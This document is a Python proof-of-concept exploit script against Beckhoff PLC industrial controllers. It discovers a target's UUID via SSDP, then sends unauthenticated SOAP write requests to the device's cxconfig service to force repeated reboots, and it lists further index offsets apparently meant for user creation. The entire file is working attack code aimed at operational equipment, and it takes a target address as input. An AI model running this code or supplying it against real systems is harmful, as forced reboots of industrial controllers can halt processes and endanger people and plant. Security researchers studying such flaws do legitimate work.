import sys, http.client, socket, re, base64, binascii


def rebootMachine(UNS, IP, IO, feedback=True):
    SoapMessage = "<?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
    SoapMessage += "<s:Body><u:Write xmlns:u=\"urn:beckhoff.com:service:cxconfig:1\"><netId></netId><nPort>0</nPort><indexGroup>0</indexGroup>"
    SoapMessage += "<IndexOffset>-" + IO + "</IndexOffset>"
    SoapMessage += "<pData>AQAAAAAA</pData></u:Write></s:Body></s:Envelope>"

    headers = {
        "Host": IP + ":5120",
        "User-Agent": "Tijls Python Script",
        "Content-type": "text/xml; charset=utf-8",
        "Content-length": "%d" % len(SoapMessage),
        "SOAPAction": "urn:beckhoff.com:service:cxconfig:1#Write"
    }

    rebootwebservice = http.client.HTTPConnection(IP, 5120)
    rebootwebservice.request(method="POST", url="/upnpisapi?uuid:" + UNS + "+urn:beckhoff.com:serviceId:cxconfig",
                             headers=headers)
    rebootwebservice.send(SoapMessage.encode())

    # statuscode, statusmessage, header = rebootwebservice.getresponse()
    statuscode = rebootwebservice.getresponse().status

    if statuscode == 200:
        if feedback:
            print("Exploit worked, device should be rebooting!")
        return 1
    else:
        if feedback:
            print("Something went wrong, the used index is probably wrong? This is the response code:")
            res = rebootwebservice.getresponse().read()
            print(res)
        return 0


def is_ipv4(ip):
    match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
    if not match:
        return False
    quad = []
    for number in match.groups():
        quad.append(int(number))
    if quad[0] < 1:
        return False
    for number in quad:
        if number > 255 or number < 0:
            return False
    return True


if not len(sys.argv) == 2:
    IP = input("Please enter the IPv4 address of the Beckhoff PLC: ")
else:
    IP = sys.argv[1]

if not is_ipv4(IP):
    print("Please go read RFC 791 and then use a legitimate IPv4 address.")
    sys.exit()

UNS = ''
ActiveRebootIndOff = '1329528576'  # Active means active Engineering Licenses (when PLC has been programmed less than a week ago)
InactiveRebootIndOff = '1330577152'  # This works for the HMI: 1329528576
HMIRebootIndOff = '1329528576'
ActiveUserIndOff = '1339031296'
InactiveUserIndOff = '1340079872'

print('Finding the unique UNS (UUID) of the target system (' + IP + '), hold on...\n')

DISCOVERY_MSG = ('M-SEARCH * HTTP/1.1\r\n' +
                 'HOST: 239.255.255.250:1900\r\n' +
                 'MAN: "ssdp:discover"\r\n' +
                 'MX: 3\r\n' +
                 'ST: upnp:rootdevice\r\n' + '\r\n')

SOCK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
SOCK.settimeout(10)
SOCK.sendto(DISCOVERY_MSG.encode(), (IP, 1900))

try:
    RESPONSE = SOCK.recv(1000).decode().split('\r\n')
except:
    print('Something went wrong, is the system online?\nTry opening http://' + IP + ':5120/config\n')
    input('Press Enter to continue...')
    sys.exit(0)

for LINE in RESPONSE:
    if ':uuid' in LINE:
        UNS = LINE[9:45]
        print('Got it: ' + LINE[9:45] + '\n')
SOCK.close()

if not UNS:
    print('\n\nProblem finding UNS, this is full SSDP response: \n')
    for LINE in RESPONSE:
        print(LINE)
    eval(input('Press Enter to continue...'))
    sys.exit(0)
else:
    if not rebootMachine(UNS, IP, InactiveRebootIndOff):
        rebootMachine(UNS, IP, ActiveRebootIndOff)
    rebootMachine(UNS, IP, HMIRebootIndOff, False)
